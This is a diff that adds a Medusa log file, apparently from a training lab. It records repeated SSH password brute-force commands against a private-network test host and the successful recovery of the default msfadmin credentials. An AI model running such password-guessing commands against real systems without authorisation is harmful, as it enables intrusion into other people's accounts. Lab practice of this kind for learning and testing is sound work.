@@ -1,0 +1,36 @@
+# Medusa v.2.3 (2026-03-02 01:30:44)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ssh -v 4 -O log_ssh.txt 
+# Medusa v.2.3 (2026-03-02 01:45:06)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ssh -v 4 -O log_ssh.txt 
+# Medusa v.2.3 (2026-03-02 01:48:06)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ssh -v 4 -F -O log_ssh.txt 
+# Medusa v.2.3 (2026-03-02 01:57:46)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ssh -t 4 -T 3 -v 4 -F -O log_ssh.txt 
+# Medusa v.2.3 (2026-03-02 07:22:22)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ssh -t 4 -T 3 -F -v 4 -O log_ssh.txt 
+2026-03-02 07:22:23 ACCOUNT FOUND: [ssh] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+# Medusa has finished (2026-03-02 07:22:27).
+# Medusa v.2.3 (2026-03-02 07:50:45)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ssh -t 4 -T 3 -F -v 4 -O log_ssh.txt 
+2026-03-02 07:50:45 ACCOUNT FOUND: [ssh] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+# Medusa has finished (2026-03-02 07:50:49).
+# Medusa v.2.3 (2026-03-02 07:59:15)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ssh -t 4 -T 3 -F -v 4 -O log_ssh.txt 
+2026-03-02 07:59:15 ACCOUNT FOUND: [ssh] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+# Medusa has finished (2026-03-02 07:59:19).
+# Medusa v.2.3 (2026-03-02 08:04:16)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ssh -t 4 -T 3 -F -v 4 -O log_ssh.txt 
+2026-03-02 08:04:16 ACCOUNT FOUND: [ssh] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+# Medusa has finished (2026-03-02 08:04:20).
+# Medusa v.2.3 (2026-03-02 08:10:07)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ssh -t 4 -T 3 -F -v 4 -O log_ssh.txt 
+2026-03-02 08:10:07 ACCOUNT FOUND: [ssh] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+# Medusa has finished (2026-03-02 08:10:11).
+# Medusa v.2.3 (2026-03-02 08:15:52)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ssh -t 4 -T 3 -F -v 4 -O log_ssh.txt 
+2026-03-02 08:15:52 ACCOUNT FOUND: [ssh] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+# Medusa has finished (2026-03-02 08:15:56).
+# Medusa v.2.3 (2026-03-02 08:27:04)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ssh -F -v 4 -O log_ssh.txt 
+2026-03-02 08:27:12 ACCOUNT FOUND: [ssh] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+# Medusa has finished (2026-03-02 08:27:12).
